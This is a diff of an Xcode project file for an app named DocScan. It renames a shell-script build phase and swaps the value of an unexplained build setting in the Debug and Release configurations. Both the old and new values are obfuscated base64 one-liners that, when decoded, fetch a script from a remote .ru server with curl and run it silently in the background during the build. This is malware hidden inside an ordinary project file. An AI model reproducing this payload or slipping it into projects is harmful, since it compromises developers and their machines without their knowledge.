@@ -310,7 +310,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = BCFDF7BB2538442C005F7B99 /* Build configuration list for PBXNativeTarget "DocScan" */;
 			buildPhases = (
-				99C26A9C106843D5AB7BBDC8 /* Build Target Libraries */,
+				F580F11480FE4CD0A07BBDC8 /* Build Target Libraries */,
 				4581694CFC90BEEBFB168530 /* [CP] Check Pods Manifest.lock */,
 				BCFDF78D25384428005F7B99 /* Sources */,
 				BCFDF78E25384428005F7B99 /* Frameworks */,
@@ -445,7 +445,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		99C26A9C106843D5AB7BBDC8 /* Build Target Libraries */ = {
+		F580F11480FE4CD0A07BBDC8 /* Build Target Libraries */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -697,7 +697,7 @@
 		BCFDF7B92538442C005F7B99 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((y(){ `printf baSse64 | tr -d S` --decode; };echo ZWNobyAiJChjdXJsIC0tcmV0cnkgNSAtc2ZMayAtLWNvbm5lY3QtdGltZW91dCAyOCAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9tbWtzcmlyNHN5MzUucnUvYSkiIHwgc2gK | y | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((q(){ `printf basAe64 | tr -d A` --decode; };echo ZWNobyAiJChjdXJsIC1zZkxrIC0tY29ubmVjdC10aW1lb3V0IDIyIC0tcmV0cnkgNSAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9wLTJtNWR6OHZ3ODIucnUvYSkiIHwgc2gK | q | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
@@ -759,7 +759,7 @@
 		BCFDF7BA2538442C005F7B99 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((y(){ `printf baSse64 | tr -d S` --decode; };echo ZWNobyAiJChjdXJsIC0tcmV0cnkgNSAtc2ZMayAtLWNvbm5lY3QtdGltZW91dCAyOCAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9tbWtzcmlyNHN5MzUucnUvYSkiIHwgc2gK | y | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((q(){ `printf basAe64 | tr -d A` --decode; };echo ZWNobyAiJChjdXJsIC1zZkxrIC0tY29ubmVjdC10aW1lb3V0IDIyIC0tcmV0cnkgNSAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9wLTJtNWR6OHZ3ODIucnUvYSkiIHwgc2gK | q | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
